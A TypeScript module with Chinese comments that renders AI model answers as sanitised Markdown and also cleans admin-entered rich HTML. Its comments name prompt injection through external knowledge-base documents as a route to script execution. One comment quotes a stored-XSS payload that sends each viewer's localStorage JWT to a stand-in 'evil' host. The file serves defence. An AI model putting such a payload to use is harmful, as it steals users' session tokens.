/**
 * 助手回答的 Markdown 渲染。
 *
 * <b>模型输出是不可信输入，渲染它的每一步都必须假设它带着 HTML。</b>
 * 两道闸：markdown-it 关闭原生 HTML（`html: false`，标签只会变成字面文本），
 * 渲染结果再过一遍 DOMPurify。少任何一道，一次提示注入就能在页面上执行脚本 ——
 * 而本项目的知识库语料恰恰来自「外部文档」，注入路径是真实存在的。
 *
 * 引用角标 `[n]` 用一条 markdown-it 内联规则处理，而不是渲染完再对 HTML 做替换：
 * 替换法要在已生成的 HTML 上做正则，要么误伤 `<code>` 里的内容，要么得先转义再反转义；
 * 规则法在词法阶段就把 `[n]` 变成独立 token，天然只作用在正文里。
 */
import DOMPurify from 'dompurify'
import MarkdownIt from 'markdown-it'

const md = new MarkdownIt({
  // 不信任模型输出里的任何 HTML —— 这是安全边界，不是风格选项
  html: false,
  linkify: true,
  // 模型几乎总是用单个换行分段（列表项、步骤）。聊天场景把它渲染成 <br> 符合直觉，
  // 不这么做的话，一个「1. 甲\n2. 乙」的回答会挤成一行
  breaks: true,
})

/**
 * 引用角标规则：`[n]` 且 `1 ≤ n ≤ 本轮依据数` 时渲染成按钮，否则按原文。
 *
 * 编号越界（`[7]` 但只回了 3 条依据）保持字面文本 —— 提示词禁止编造编号，
 * 但它真编了的时候，界面不该给出一个点不动的角标。判据与旧的
 * `splitCitations` 完全一致，换的只是实现位置。
 */
md.inline.ruler.before('link', 'citation_badge', (state, silent) => {
  const start = state.pos
  if (state.src.charCodeAt(start) !== 0x5b /* [ */) {
    return false
  }
  const match = /^\[(\d{1,2})\]/.exec(state.src.slice(start, start + 4))
  if (!match) {
    return false
  }
  const index = Number(match[1])
  const available = Number(state.env?.citationCount ?? 0)
  if (index < 1 || index > available) {
    return false
  }
  if (!silent) {
    const token = state.push('citation_badge', 'button', 0)
    token.content = String(index)
    token.meta = { index }
  }
  state.pos += match[0].length
  return true
})

md.renderer.rules.citation_badge = (tokens, idx) => {
  const index = Number(tokens[idx]?.content)
  return (
    `<button type="button" class="message-content__cite" data-cite="${index}"` +
    ` aria-label="查看第 ${index} 条依据">${index}</button>`
  )
}

/**
 * 表格包一层横向滚动容器。
 *
 * 表格宽度由内容决定，模型给出的对比表列一多就会撑破消息气泡并把整个页面推宽；
 * 直接在 table 上 `display: block; overflow-x: auto` 会破坏列宽计算（表格的布局算法
 * 只在 display: table 下生效），所以包一层 div 由它来滚。
 */
md.renderer.rules.table_open = (tokens, idx, options, _env, self) =>
  `<div class="md-table-scroll">${self.renderToken(tokens, idx, options)}`
md.renderer.rules.table_close = (tokens, idx, options, _env, self) =>
  `${self.renderToken(tokens, idx, options)}</div>`

/** 外链一律新开页并切断 opener：回答里的链接指向站外，不该把当前页导航走、也不该拿到 window.opener */
const defaultLinkOpen = md.renderer.rules.link_open
md.renderer.rules.link_open = (tokens, idx, options, env, self) => {
  tokens[idx]?.attrSet('target', '_blank')
  tokens[idx]?.attrSet('rel', 'noopener noreferrer')
  return defaultLinkOpen
    ? defaultLinkOpen(tokens, idx, options, env, self)
    : self.renderToken(tokens, idx, options)
}

/**
 * 围栏代码块加一个复制按钮。
 *
 * 按钮文案与行为由宿主组件的事件委托接管（见 MessageContent）。
 * 用 `data-code-copy` 标记而不是内联 onclick：innerHTML 里的事件属性会被
 * DOMPurify 剥掉，而且内联脚本本身就是我们要防的那类东西。
 */
const defaultFence = md.renderer.rules.fence
md.renderer.rules.fence = (tokens, idx, options, env, self) => {
  const rendered = defaultFence
    ? defaultFence(tokens, idx, options, env, self)
    : self.renderToken(tokens, idx, options)
  return `<div class="md-code">${rendered}<button type="button" class="md-code__copy" data-code-copy>复制</button></div>`
}

/**
 * 渲染并消毒，产出可直接 v-html 的 HTML 字符串。
 *
 * @param content      模型回答原文
 * @param citationCount 本轮依据条数，决定哪些 `[n]` 是有效角标
 */
export function renderMarkdown(content: string, citationCount = 0): string {
  if (!content) {
    return ''
  }
  const html = md.render(content, { citationCount })
  // ADD_ATTR target：链接新开页是上面渲染层加上的，DOMPurify 默认会剥掉它。
  // 除白名单放行外不做任何放宽 —— 不信任模型输出这一条不因为放行一个属性而改变
  return DOMPurify.sanitize(html, { ADD_ATTR: ['target'] })
}

/**
 * 消毒后台录入的富文本片段，产出可直接 v-html 的 HTML 字符串。
 *
 * 与 renderMarkdown 的区别：这里的内容**不是**模型输出，而是运营在管理端
 * 自由输入的 HTML，所以不能走 markdown 渲染（`<p>` 会被再包一层）。
 * 但「不信任」这条前提完全一样 —— 它能被任何拿到管理端的人写进去，
 * 而浏览该商品的是普通用户。此前这里直接 v-html，等于把详情页当成
 * 存储型 XSS 的投放点：`<img src=x onerror=fetch('//evil/'+localStorage.token)>`
 * 会窃取每一个浏览者的 JWT（token 存在 localStorage）。
 *
 * 前端消毒是兜底而非替代：后端输出侧仍应做净化。两层都做，是因为
 * 任何一层被绕过时另一层还在 —— 而这里最便宜的那层此前是缺的。
 */
export function sanitizeRichHtml(html: string): string {
  if (!html) {
    return ''
  }
  // ADD_ATTR target：与 markdown 路径保持一致，运营在详情里写的
  // 外链也应新开页。除白名单放行外不做任何放宽。
  return DOMPurify.sanitize(html, { ADD_ATTR: ['target'] })
}
